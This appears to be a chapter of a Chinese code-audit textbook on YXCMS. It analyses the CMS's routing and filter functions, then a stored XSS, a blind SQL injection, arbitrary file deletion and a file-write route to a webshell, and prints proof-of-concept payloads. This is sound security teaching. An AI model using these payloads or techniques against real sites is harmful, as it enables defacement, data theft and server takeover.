\u5728\u8FDB\u884C\u4EE3\u7801\u5BA1\u8BA1\u524D\u9700\u8981\u4E86\u89E3\u6BCF\u4E2ACMS\u7684\u8DEF\u7531\u60C5\u51B5\uFF0C\u5373\u7A0B\u5E8F\u662F\u5982\u4F55\u4ECE\u7F51\u7AD9\u7684URL\u4F20\u9012\u81F3\u540E\u53F0\u4EE3\u7801\u3002\u53EA\u6709\u5BF9\u7F51\u7AD9\u7684\u8DEF\u7531\u60C5\u51B5\u719F\u6089\u624D\u80FD\u719F\u7EC3\u7684\u5206\u6790CMS\u7684\u6F0F\u6D1E\u4E0E\u6F0F\u6D1E\u5229\u7528\u94FE\u3002\r
\r
YXCMS\u7F51\u7AD9\u4E2D\u540E\u53F0\u7BA1\u7406\u5458URL\u4E3A\uFF1A\r
\r
http://127.0.0.1/YXCMS/index.php?r=admin/index/index#\r
\r
\u8BE5\u7F51\u7AD9\u5C06\u8BBF\u95EEindex.php\u6587\u4EF6\uFF0C\u8BE5\u6587\u4EF6\u4E2D\u5305\u542B\u4E86protected/core.php\u6587\u4EF6\uFF0C\u56E0\u6B64\u5728\u6587\u4EF6core.php\u4E2D\u67E5\u770B\u8DEF\u7531\u60C5\u51B5\uFF0C\u5176\u6838\u5FC3\u8DEF\u7531\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
function urlRoute(){\r
\r
  $rewrite = config('REWRITE');   //\u8C03\u7528config\u65B9\u6CD5\u8FD4\u56DE$rewrite\u53D8\u91CF\r
\r
//\u5982\u679C$rewrite\u4E0D\u4E3A\u7A7A\u5219\u5BF9\u8BF7\u6C42\u8FDB\u884C\u5904\u7406\r
\r
  if( !empty($rewrite) ) {\r
\r
\u200B    if( ($pos = strpos( $_SERVER['REQUEST_URI'], '?' )) !== false ){\r
\r
\u200B      parse_str( substr( $_SERVER['REQUEST_URI'], $pos + 1 ), $_GET );}\r
\r
\u200B    foreach($rewrite as $rule => $mapper){...\u7701\u7565...}\r
\r
\u200B    if(empty($_REQUEST['r']) && trim($_SERVER["REQUEST_URI"],'/')) $_REQUEST['nor']=true;}\r
\r
**//\u5C06\u8BF7\u6C42r\u53C2\u6570\u6839\u636E/\u8FDB\u884C\u5206\u9694\u4E3A\u6570\u7EC4**\r
\r
  **$route_arr** **= isset($_REQUEST['r']) ? explode("/", htmlspecialchars($_REQUEST['r'])) : array();** \r
\r
//\u6839\u636E\u5206\u9694\u7684\u6570\u7EC4\u83B7\u5F97$app_name\u3001$controller_name\u3001$action_name\r
\r
  **$app_name** = empty(**$route_arr[0]**) ? DEFAULT_APP : strtolower($route_arr[0]);\r
\r
  **$controller_name** = empty(**$route_arr[1]**) ? DEFAULT_CONTROLLER : strtolower($route_arr[1]);\r
\r
  **$action_name** = empty(**$route_arr[2]**) ? DEFAULT_ACTION : $route_arr[2];\r
\r
  $_REQUEST['r'] = $app_name .'/'. $controller_name .'/'. strtolower($action_name);\r
\r
//\u5B9A\u4E49\u53D8\u91CF\r
\r
  **define('APP_NAME', $app_name);**\r
\r
  **define('CONTROLLER_NAME', $controller_name);**\r
\r
  **define('ACTION_NAME', $action_name);}**\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6838\u5FC3\u529F\u80FD\u662F\u5BF9\u8BF7\u6C42\u6309\u7167\u659C\u6760/\u8FDB\u884C\u5206\u9694\uFF0C\u7136\u540E\u5C06\u5206\u9694\u540E\u7684\u53C2\u6570\u503C\u5B9A\u4E49\u4E3A\u4E0D\u540C\u7684\u53D8\u91CF\u3002\r
\r
\u4F8B\u5982\uFF1A\u201Chttp://127.0.0.1/YXCMS/index.php?r=admin/index/index#\u201D\uFF0Cr\u53C2\u6570\u5C06\u88AB\u5206\u9694\u4E3A\u201Cadmin\u201D\u3001\u201Cindex\u201D\u3001\u201Cindex\u201D\u4E09\u4E2A\u53C2\u6570\uFF0C\u800C\u8FD9\u4E09\u4E2A\u53C2\u6570\u5206\u522B\u5BF9\u5E94\u201CAPP_NAME\u201D\u3001\u201CCONTROLLER_NAME\u201D\u3001\u201CACTION_NAME\u201D\u3002\u8BE5\u8BF7\u6C42\u4EE3\u8868\u8C03\u7528\u4E86indexController.php\u7684index\u65B9\u6CD5\uFF0C\u5982\u56FE12-3\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image576.jpg)\r
\r
\u56FE12-3 \u8DEF\u7531\u5206\u6790\u56FE\r
\r
\u7ECF\u8FC7\u5206\u6790\u5F97\u51FA\u8BE5CMS\u901A\u8FC7URL\u8DEF\u5F84\u4E2D\u7684r\u53C2\u6570\u8FDB\u884C\u5206\u9694\u5E76\u53D1\u9001\u5230\u6307\u5B9A\u7684Controller\u5C42\u8C03\u7528\u65B9\u6CD5\u3002\r
\r
5.CMS\u8FC7\u6EE4\u51FD\u6570\u4E86\u89E3\r
\r
\u901A\u8FC7\u5BF9\u8BE5CMS\u7684\u901A\u7528\u6587\u4EF6protected\\include\\lib\\common.function.php\u8FDB\u884C\u4E86\u89E3\uFF0C\u53D1\u73B0\u8BE5\u6587\u4EF6\u4E0B\u51FD\u6570\u90FD\u4E3A\u8FC7\u6EE4\u51FD\u6570\uFF0C\u5176\u4E2D\u8FC7\u6EE4\u51FD\u6570\u5982\u886812-3\u6240\u793A\u3002\u8FD9\u4E9B\u8FC7\u6EE4\u51FD\u6570\u901A\u5E38\u5728\u5206\u6790\u53C2\u6570\u8FC7\u6EE4\u6F0F\u6D1E\u65F6\u8D77\u5230\u5173\u952E\u4F5C\u7528\u3002\r
\r
\u886812-3 proctected\u6587\u4EF6\u76EE\u5F55\u7ED3\u6784\r
\r
| **\u51FD\u6570\u540D**            | **\u51FD\u6570\u4F5C\u7528**                                                 |\r
| --------------------- | ------------------------------------------------------------ |\r
| in\u51FD\u6570                | \u7528\u6765\u8FC7\u6EE4\u5B57\u7B26\u4E32\u548C\u5B57\u7B26\u4E32\u6570\u7EC4\uFF0C\u9632\u6B62\u88AB\u6302\u9A6C\u548CSQL\u6CE8\u5165  \u53C2\u6570$data\uFF0C\u5F85\u8FC7\u6EE4\u7684\u5B57\u7B26\u4E32\u6216\u5B57\u7B26\u4E32\u6570\u7EC4\uFF0C |\r
| out\u51FD\u6570               | \u7528\u6765\u8FD8\u539F\u5B57\u7B26\u4E32\u548C\u5B57\u7B26\u4E32\u6570\u7EC4\uFF0C\u628A\u5DF2\u7ECF\u8F6C\u4E49\u7684\u5B57\u7B26\u8FD8\u539F\u56DE\u6765         |\r
| text_in\u4E0Etext_out\u51FD\u6570 | \u6587\u672C\u8F93\u5165\u8F93\u51FA\u8FC7\u6EE4                                             |\r
| removeXSS\u51FD\u6570         | \u9632\u5FA1XSS\u6F0F\u6D1E\u51FD\u6570                                              |\r
| html_in\u4E0Ehtml_out\u51FD\u6570 | html\u4EE3\u7801\u8F93\u5165\u4E0E\u8F93\u51FA\u8FC7\u6EE4                                       |\r
| \`deletehtml\u51FD\u6570\`      | \`\u53BB\u9664html\u548Cjs\u6807\u7B7E\`                                           |\r
| get_client_ip\u51FD\u6570     | \u83B7\u53D6\u5BA2\u6237\u7AEFIP\u5730\u5740                                             |\r
\r
## 12.2 \u7559\u8A00\u677F\u5B58\u50A8\u578BXSS\u5206\u6790\r
\r
\u5F53\u8BBF\u95EEhttp://ip/YXCMS/index.php?r=default/column/index&col=guestbook\u65F6\uFF0C\u5C06\u8FDB\u5165\u7CFB\u7EDF\u7684\u7559\u8A00\u677F\u754C\u9762\u3002\u5224\u65AD\u8BE5\u529F\u80FD\u662F\u5426\u5B58\u5728XSS\u6F0F\u6D1E\u9700\u8981\u8FDB\u884C\u5982\u4E0B\u5206\u6790\uFF1A\r
\r
l \u6570\u636E\u5B58\u50A8\u6D41\u7A0B\u4E0E\u8FC7\u6EE4\u60C5\u51B5\u5206\u6790\uFF1B\r
\r
l \u524D\u53F0\u9875\u9762\u663E\u793A\u6570\u636E\u5206\u6790\u3002\r
\r
1.\u6570\u636E\u5B58\u50A8\u6D41\u7A0B\u5206\u6790\r
\r
\u6839\u636E\u4E0A\u6587\u8BE5CMS\u7684\u8DEF\u7531\u5206\u6790\u53EF\u77E5\uFF0C\u8BE5\u8BF7\u6C42\u5C06\u88AB\u8DEF\u7531\u6587\u4EF6protected\\apps\\default\\controller\\columnController.php\u7684index\u65B9\u6CD5\uFF0C\u5176\u90E8\u5206\u4EE3\u7801\u5982\u56FE12-4\u6240\u793A\u3002\u5176\u6D41\u7A0B\u4F7F\u7528\u201Cswitch/case\u201D\u8BED\u53E5\u6839\u636E\u53D8\u91CF$sortinfo\u7684type\u5C5E\u6027\u5224\u65AD\u8C03\u7528\u54EA\u4E2A\u51FD\u6570\uFF0C\u5728PHP\u4EE3\u7801\u4E2D\u6DFB\u52A0\u4EE3\u7801\u201Cvar_dump($sortinfo);\u201D\u540E\uFF0C\u5237\u65B0\u9875\u9762\u663E\u793A\u8BE5\u53D8\u91CF\u7C7B\u578B\u4E3A6\uFF0C\u56E0\u6B64\u8C03\u7528extend\u51FD\u6570\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image578.jpg)\r
\r
\u56FE12-4 index\u65B9\u6CD5\u4EE3\u7801\u56FE\r
\r
extend\u51FD\u6570\u5C06\u5224\u65AD\u8BE5\u4F20\u9012\u7684\u53C2\u6570$tableinfo[$i][\u2018tableinfo\u2019]\uFF08\u7ECF\u8FC7\u5206\u6790\u53EF\u77E5\u8BE5\u53C2\u6570\u4E3APOST\u4F20\u9012\u7684tname\u53D8\u91CF\uFF09\u662F\u5426\u4E3A\u6570\u7EC4\uFF0C\u5982\u679C\u4E0D\u662F\u6570\u7EC4\u5219\u8C03\u7528html_in\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u82E5\u662F\u6570\u7EC4\u5219\u8C03\u7528deletehtml\u51FD\u6570\u548Cin\u51FD\u6570\u8FDB\u884C\u8FC7\u6EE4\u3002\u901A\u8FC7\u5206\u6790\u53EF\u77E5html_in\u51FD\u6570\u7531\u4E8E\u8FC7\u6EE4\u4E25\u683C\u65E0\u6CD5\u7ED5\u8FC7\uFF0C\u800Cdeletehtml\u4E0Ein\u51FD\u6570\u53EF\u4EE5\u8FDB\u884C\u7ED5\u8FC7\uFF0C\u5176\u4EE3\u7801\u5982\u56FE12-5\u6240\u793A\u3002\uFF08\u6570\u636E\u5B58\u50A8\u81F3\u6570\u636E\u5E93\u7684\u4EE3\u7801\u3001\u8FC7\u6EE4\u51FD\u6570\u4EE3\u7801\u7701\u7565\uFF09\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image580.jpg)\r
\r
\u56FE12-5 extend\u65B9\u6CD5\u4EE3\u7801\u56FE\r
\r
  \u7ED5\u8FC7\u4E0A\u8FF0\u8FC7\u6EE4\u51FD\u6570\u7684Payload\u4E3A\r
\r
tname[]=**an<script%26gt;alert(1)<\/script%26gt;**&tel=15600106593&qq=asdf&content=asdfasdf&checkcode=4341&__hash__=2593aa0f02fcdb094b61ef7d6d733bfb_5dbch3bCiC8X5V%2BsgijPcxEIiTmMoz9Vjvg5SsSyCDscGbRJiFQus7Y\r
\r
2.\u524D\u53F0\u9875\u9762\u663E\u793A\u6570\u636E\u5206\u6790\u3002\r
\r
\u5728\u7BA1\u7406\u5458\u540E\u53F0\u7684\u7559\u8A00\u672C\u4E2D\uFF0C\u53EF\u4EE5\u5BF9\u4E0A\u6587\u63D0\u4EA4\u7684\u7559\u8A00\u8FDB\u884C\u5BA1\u6838\u3002\u9700\u8981\u5BF9\u8BE5\u7A0B\u5E8F\u663E\u793A\u6570\u636E\u7684\u6D41\u7A0B\u8FDB\u884C\u5206\u6790\u3002\u901A\u8FC7BurpSuite\u6293\u5305\u53EF\u77E5\u8BE5\u8BF7\u6C42\u4E3Ahttp://ip/YXCMS/index.php?r=admin/extendfield/meslist&id=12\u5176\u5BF9\u5E94\u6587\u4EF6\u4E3AextendfieldController.php\u7684meslist\u65B9\u6CD5\u3002\u8BE5\u65B9\u6CD5\u672A\u7ECF\u8FC7\u4EFB\u4F55\u8FC7\u6EE4\u5C06\u5185\u5BB9\u76F4\u63A5\u6253\u5370\u81F3\u9875\u9762\u4E2D\u3002\r
\r
3.\u6F0F\u6D1E\u6D4B\u8BD5\r
\r
\u4F7F\u7528BurpSuite\u62E6\u622A\u63D0\u4EA4\u7559\u8A00\u7684\u6570\u636E\u5305\uFF0C\u5E76\u4FEE\u6539\u4E3A\u4E0A\u8FF0\u7684Payload\u63D0\u4EA4\u540E\uFF0C\u767B\u5F55\u7BA1\u7406\u5458\u540E\u53F0\uFF0C\u70B9\u51FB\u201C\u7559\u8A00\u672C\u201D\u51FA\u73B0\u5F39\u6846\u529F\u80FD\uFF0C\u5982\u56FE12-6\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image582.jpg)\r
\r
\u56FE12-6\u5B58\u50A8\u578BXSS\u6548\u679C\u56FE\r
\r
## 12.3 \u788E\u7247\u7BA1\u7406SQL\u6CE8\u5165\u5206\u6790\r
\r
\u8BE5CMS\u7684\u788E\u7247\u7BA1\u7406\u529F\u80FD\u5904\u5B58\u5728\u65E0\u5355\u5F15\u53F7\u4FDD\u62A4\u7684SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\u7BA1\u7406\u5458\u767B\u5F55\u540E\u53F0\u5C06\u8FDB\u5165\u788E\u7247\u7BA1\u7406\u754C\u9762\uFF0C\u5BF9\u788E\u7247\u8FDB\u884C\u5220\u9664\u64CD\u4F5C\uFF0C\u5982\u56FE12-7\u6240\u793A\u3002\u901A\u8FC7\u4F7F\u7528BurpSuite\u62E6\u622A\u6570\u636E\u5305\u53D1\u73B0\u8BE5\u8BF7\u6C42\u94FE\u63A5\u4E3Ahttp://ip/YXCMS/index.php?r=admin/fragment/del\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image584.jpg)\r
\r
\u56FE12-7 SQL\u6CE8\u5165\u64CD\u4F5C\u56FE\r
\r
1.\u6570\u636E\u5B58\u50A8\u6D41\u7A0B\u5206\u6790\r
\r
\u5BA1\u8BA1\u8BE5HTTP\u8BF7\u6C42\u662F\u5426\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u6587\u4EF6fragmentController.php\u4E2D\u7684index\u65B9\u6CD5\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
  public function del()\r
\r
  {\r
\r
\u200B    if(!$this->isPost()){         //\u82E5\u4E0D\u662FPOST\u65B9\u6CD5\u5219\u8C03\u7528\u4EE5\u4E0B\u6D41\u7A0B\r
\r
\u200B      $id=intval($_GET['id']);\r
\r
\u200B      if(empty($id)) $this->error('\u60A8\u6CA1\u6709\u9009\u62E9~');\r
\r
\u200B      if(model('fragment')->**delete("id='$id'")) //****\u6709\u5355\u5F15\u53F7\u4FDD\u62A4**\r
\r
\u200B      else echo '\u5220\u9664\u5931\u8D25~';\r
\r
\u200B    }else{                 //\u82E5\u662FPOST\u65B9\u6CD5\u5219\u8C03\u7528\u4EE5\u4E0B\u6D41\u7A0B\r
\r
\u200B      if(empty($_POST['delid'])) $this->error('\u60A8\u6CA1\u6709\u9009\u62E9~');\r
\r
\u200B      $delid=implode(','**,$_POST['delid']);//****\u53C2\u6570delid\u7528\u9017\u53F7\u8FDE\u63A5**\r
\r
\u200B      **if(model('fragment')->delete('id in ('.$delid.')'))//****\u672A\u5355\u5F15\u53F7\u4FDD\u62A4**\r
\r
\u200B      $this->success('\u5220\u9664\u6210\u529F',url('fragment/index'));\r
\r
\u200B    }}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6D41\u7A0B\u5206\u6790\uFF1A\r
\r
l \u5224\u65ADHTTP\u8BF7\u6C42\u662F\u5426\u4E3APOST\u65B9\u6CD5\u3002\r
\r
l \u82E5\u4E3APOST\u65B9\u6CD5\u5219\u5C06\u53C2\u6570$delid\u8C03\u7528delete\u65B9\u6CD5\u6267\u884C\u5220\u9664\u64CD\u4F5C\uFF0C\u503C\u5F97\u6CE8\u610F\u7684\u662F\u4E0A\u8FF0\u4EE3\u7801\u4F20\u9012\u5B57\u7B26\u4E32'id in ('.$delid.')'\uFF0C\u53C2\u6570$delid\u672A\u7ECF\u8FC7\u53CC\u5F15\u53F7\u4FDD\u62A4\uFF0C\u53EF\u80FD\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
\u901A\u8FC7\u5BA1\u8BA1\u5220\u9664\u788E\u7247\u8FC7\u7A0B\u4E2D\uFF0C\u53C2\u6570$delid\u7684\u4F20\u9012\u8FC7\u7A0B\uFF0C\u5982\u56FE12-8\u6240\u793A\u3002\u53C2\u6570$delid\u6700\u7EC8\u7ECF\u8FC7\u4F20\u9012\uFF0C\u4F7F\u7528real_escape_string\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u540C\u65F6\u8BE5\u53C2\u6570\u672A\u4F7F\u7528\u5F15\u53F7\u8FDB\u884C\u4FDD\u62A4\u3002\u56E0\u6B64\u53EF\u901A\u8FC7$delid\u5F62\u6210SQL\u6CE8\u5165\u6F0F\u6D1E\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image586.jpg)\r
\r
\u56FE12-8 \u53C2\u6570$delid\u4F20\u9012\u6D41\u7A0B\u56FE\r
\r
2\uFF0E\u6F0F\u6D1E\u6D4B\u8BD5\r
\r
SQL\u6267\u884C\u8BED\u53E5\u6838\u5FC3\u4EE3\u7801\u5728\u6587\u4EF6protected\\include\\core\\cpModel.class.php\u5904\u7684delete\u65B9\u6CD5\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
  public function delete() {\r
\r
\u200B    $table = $this->options['table'];  //\u5F53\u524D\u8868\r
\r
\u200B    **$where = $this->_parseCondition();** //\u6761\u4EF6\r
\r
\u200B    if ( empty($where) ) return false; //\u5220\u9664\u6761\u4EF6\u4E3A\u7A7A\u65F6\uFF0C\u5219\u8FD4\u56DEfalse\uFF0C\u907F\u514D\u6570\u636E\u4E0D\u5C0F\u5FC3\u88AB\u5168\u90E8\u5220\u9664\r
\r
**//\u524D\u9762\u4EE3\u7801\u58F0\u660E$table\u4E3Ayx_fragment\uFF0C$where\u4E3AWHERE id in ($delid)**\r
\r
\u200B    $this->sql = **"DELETE FROM $table $where";** \r
\r
\u200B    $query = $this->db->execute($this->sql);\r
\r
\u200B    var_dump($this->sql);//\u5C0F\u6280\u5DE7\uFF1A\u4F7F\u7528var_dump\u67E5\u770B\u6267\u884C\u7684SQL\u8BED\u53E5\r
\r
\u200B    return $this->db->affectedRows();}\r
\r
\r
\r
\u7ECF\u8FC7\u5206\u6790\u53EF\u77E5\u6700\u7EC8\u6784\u9020\u7684SQL\u8BED\u53E5\u4E3A\u201CDELETE FROM yx_fragment WHERE id in ($delid)\u201D\u3002\u82E5\u6784\u9020payload\u4E3A\u201C1) or if(sleep(3),1,1\u201D\u5B8C\u6210\u65F6\u95F4\u76F2\u6CE8\uFF0C\u6700\u7EC8\u53EF\u4EE5\u62FC\u63A5\u7684SQL\u8BED\u53E5\u4E3A\u201CDELETE FROM yx_fragment WHERE id in (1) or if(sleep(3),1,1)\u201D\u3002\u6267\u884CPayload\u82E5\u7B49\u5F85\u4E863\u79D2\u8BF4\u660E\u5B58\u5728SQL\u6CE8\u5165\u6F0F\u6D1E\uFF0C\u5176\u4F7F\u7528BurpSuite\u53D1\u9001\u6570\u636E\u5305\uFF0C\u5982\u56FE12-9\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image588.jpg)\r
\r
\u56FE12-9 BurpSuite\u7684SQL\u6CE8\u5165\u56FE\r
\r
## 12.4 \u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u5206\u6790\r
\r
\u4EFB\u610F\u6587\u4EF6\u64CD\u4F5C\u6F0F\u6D1E\u7684\u6316\u6398\u901A\u5E38\u662F\u5BF9\u4EE3\u7801\u8FDB\u884C\u5168\u5C40\u641C\u7D22\u5371\u9669\u51FD\u6570\uFF0C\u800C\u8BE5CMS\u4E2D\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u548C\u4EFB\u610F\u6587\u4EF6\u5199\u5165\u6F0F\u6D1E\uFF0C\u672C\u5C0F\u8282\u5C06\u5BF9\u8FD9\u4E24\u4E2A\u6F0F\u6D1E\u8FDB\u884C\u5206\u6790\u3002\r
\r
### 12.4.1 YMCMS\u4EFB\u610F\u6587\u4EF6\u5220\u9664\r
\r
\u8BE5\u529F\u80FD\u70B9\u5B58\u5728\u4E8E\u540E\u53F0\u7BA1\u7406\u9875\u9762\uFF0C\u5F53\u7528\u6237\u70B9\u51FB\u201C\u4E0A\u4F20\u6587\u4EF6\u7BA1\u7406\u201D\u6807\u7B7E\u65F6\uFF0C\u4F20\u9012\u7684\u6587\u4EF6\u540D\u53C2\u6570\u672A\u7ECF\u8FC7\u8FC7\u6EE4\uFF0C\u5BFC\u81F4\u53EF\u4EE5\u5220\u9664install.lock\u6587\u4EF6\u9020\u6210\u4EE5\u7CFB\u7EDF\u7684\u91CD\u88C5\u6F0F\u6D1E\uFF08\u91CD\u88C5\u6F0F\u6D1E\u662F\u7531\u4E8E\u5220\u9664\u4E86\u7CFB\u7EDF\u7684lock\u6587\u4EF6\u5BFC\u81F4\u8BE5CMS\u53EF\u4EE5\u88AB\u653B\u51FB\u8005\u91CD\u65B0\u5B89\u88C5\u7684\u6F0F\u6D1E\uFF09\u3002\r
\r
\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u7684\u8BF7\u6C42\u94FE\u63A5\u4E3A\uFF1A\u201Chttp://ip/YXCMS/index.php?r=admin/files/del&fname=%2CNoPic.gif\u201D\u3002\u8BE5\u94FE\u63A5\u89E6\u53D1\u7684\u6587\u4EF6\u662Fprotected\\apps\\admin\\controller\\filesController.php\u4E2D\u7684del\u65B9\u6CD5\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
  public function del()\r
\r
  {\r
\r
\u200B    $dirs=in($_GET['fname']);      //\u901A\u8FC7fname\u83B7\u53D6\u6587\u4EF6\u540D\r
\r
\u200B    $dirs=str_replace(',','/',$dirs);  //\u5C06\uFF0C\u66FF\u6362\u4E3A/\r
\r
\u200B    $dirs=ROOT_PATH.'upload'.$dirs;   //\u62FC\u63A5\u6587\u4EF6\u8DEF\u5F84\u4E3Aupload\u6587\u4EF6\u5939\u4E0B\u6587\u4EF6\r
\r
\u200B    if(is_dir($dirs)){del_dir($dirs); echo 1;} //\u5224\u65AD\u662F\u5426\u4E3A\u6587\u4EF6\u5939\u5E76\u5220\u9664\r
\r
\u200B    elseif(file_exists($dirs)){        //\u5224\u65AD\u662F\u5426\u4E3A\u6587\u4EF6\u5E76\u5220\u9664\r
\r
\u200B      if(unlink($dirs)) echo 1;\r
\r
\u200B    }else echo '\u6587\u4EF6\u4E0D\u5B58\u5728'; }\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6587\u4EF6\u672A\u5BF9\u53C2\u6570fname\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4ECE\u800C\u5BFC\u81F4\u53EF\u4EE5\u5220\u9664\u8BE5\u7CFB\u7EDF\u4EFB\u610F\u6587\u4EF6\uFF0C\u4EE5upload\u6587\u4EF6\u5939\u4E0Btest.txt\u6587\u4EF6\u4E3A\u4F8B\uFF0C\u4F7F\u7528BurpSuite\u62E6\u622A\u5220\u9664\u8BF7\u6C42\u5E76\u4FEE\u6539\u540E\u7684\u6548\u679C\u5982\u56FE12-10\u6240\u793A\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image590.jpg)\r
\r
\u56FE12-10 BurpSuite\u5220\u9664\u4EFB\u610F\u6587\u4EF6\u6548\u679C\u56FE\r
\r
### 12.4.2 YMCMS\u4EFB\u610F\u6587\u4EF6\u5199\u5165\r
\r
\u8BE5\u529F\u80FD\u70B9\u5B58\u5728\u4E8E\u540E\u53F0\u7BA1\u7406\u9875\u9762\uFF0C\u5F53\u7528\u6237\u70B9\u51FB\u201C\u524D\u53F0\u6A21\u677F\u7BA1\u7406\u201D->\u201C\u7BA1\u7406\u6A21\u677F\u6587\u4EF6\u201D->\u201C\u65B0\u5EFA\u201D\u6807\u7B7E\u65F6\uFF0C\u53EF\u4EE5\u5411\u670D\u52A1\u5668\u5199\u5165PHP\u6587\u4EF6\u3002\u901A\u8FC7\u8BE5\u529F\u80FD\u53EF\u5199\u5165\u6728\u9A6C\u6587\u4EF6\u4ECE\u800C\u8FDB\u884C\u8FDC\u7A0B\u8FDE\u63A5\u3002\r
\r
\u5B58\u5728\u4EFB\u610F\u6587\u4EF6\u5220\u9664\u7684\u8BF7\u6C42\u94FE\u63A5\u4E3A\uFF1A\u201Chttp://ip/YXCMS/index.php?r=admin/set/tpadd&Mname=default\u201D\u3002\u8BE5\u94FE\u63A5\u89E6\u53D1\u7684\u6587\u4EF6\u662Fprotected\\apps\\admin\\controller\\setController.php\u4E2D\u7684tpadd\u65B9\u6CD5\uFF0C\u5176\u4EE3\u7801\u5982\u4E0B\uFF1A\r
\r
\r
\r
  public function tpadd()\r
\r
  {\r
\r
\u200B    $tpfile=$_GET['Mname'];  //\u4F20\u9012\u503C\u4E3Adefault\r
\r
\u200B    if(empty($tpfile)) $this->error('\u975E\u6CD5\u64CD\u4F5C~');\r
\r
**//\u503C\u4E3Aapps/default/view/default**\r
\r
\u200B    **$templepath=BASE_PATH . $this->tpath.$tpfile.'/';** \r
\r
\u200B    if($this->isPost()){\r
\r
\u200B      **$filename=trim($_POST['filename']);**\r
\r
\u200B      $code=stripcslashes($_POST['code']);\r
\r
\u200B      if(empty($filename)||empty($code)) $this->error('\u6587\u4EF6\u540D\u5185\u5BB9\u4E0D\u80FD\u4E3A\u7A7A');\r
\r
\u200B     **$filepath=$templepath.$filename.'.php';**\r
\r
\u200B     if($this->**ifillegal($filepath)**) {$this->error('\u975E\u6CD5\u6587\u4EF6\u8DEF\u5F84~');exit;}\r
\r
\u200B     try{**file_put_contents($filepath, $code);**\r
\r
\u200B     } catch(Exception $e) {$this->error('\u6A21\u677F\u6587\u4EF6\u521B\u5EFA\u5931\u8D25\uFF01');}  \r
\r
\u200B     $this->success('\u6A21\u677F\u6210\u529F',url('set/tplist',array('Mname'=>$tpfile)));\r
\r
\u200B    }else{\r
\r
\u200B      $this->tpfile=$tpfile;\r
\r
\u200B      $this->display();}}\r
\r
\r
\r
\u4E0A\u8FF0\u4EE3\u7801\u6D41\u7A0B\uFF1A\r
\r
l \u6839\u636E\u4F20\u9012\u7684Mname\u53C2\u6570\u62FC\u63A5\u6587\u4EF6\u5B58\u50A8\u8DEF\u5F84$templepath\u503C\u4E3Aapps/default/view/default\u3002\r
\r
l \u83B7\u53D6\u6587\u4EF6\u540D$filename\u5E76\u5224\u65AD\u662F\u5426\u4E3A\u7A7A\u3002\r
\r
l \u62FC\u63A5\u5B58\u50A8\u6587\u4EF6\u4E3A$filepath=$templepath.$filename.'.php'\u3002\r
\r
l \u5224\u65AD$filepath\u662F\u5426\u7B26\u5408\u8FC7\u6EE4\u51FD\u6570ifillegal\u8981\u6C42\uFF08\u8BE5\u8FC7\u6EE4\u51FD\u6570\u8981\u6C42\u4E0D\u80FD\u5305\u542B./\u548C\\\\\u548C/view/\uFF0C\u9632\u5FA1\u76EE\u5F55\u904D\u5386\u6F0F\u6D1E\uFF09\u3002\r
\r
l \u8C03\u7528file_put_contents\u51FD\u6570\u4E0A\u4F20\u6587\u4EF6\u3002\r
\r
\u7A0B\u5E8F\u5728\u4E0A\u4F20\u6587\u4EF6\u8FC7\u7A0B\u4E2D\uFF0C\u5E76\u672A\u5BF9\u6587\u4EF6\u5185\u5BB9\u53CA\u6587\u4EF6\u540D\u8FDB\u884C\u8FC7\u6EE4\uFF0C\u4ECE\u800C\u5BFC\u81F4\u7528\u6237\u53EF\u4EE5\u4E0A\u4F20\u4EFB\u610F\u6587\u4EF6\u81F3\u670D\u52A1\u5668\uFF0C\u56FE12-11\u4E3A\u4F7F\u7528\u4E0A\u4F20\u6728\u9A6C\u6587\u4EF6\u793A\u610F\u56FE\u3002\r
\r
![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image592.jpg)\r
\r
\u56FE12-11 \u4EFB\u610F\u6587\u4EF6\u5199\u5165\u6548\u679C\u56FE\r
\r
## 12.5 \u5355\u5143\u5C0F\u7ED3\r
\r
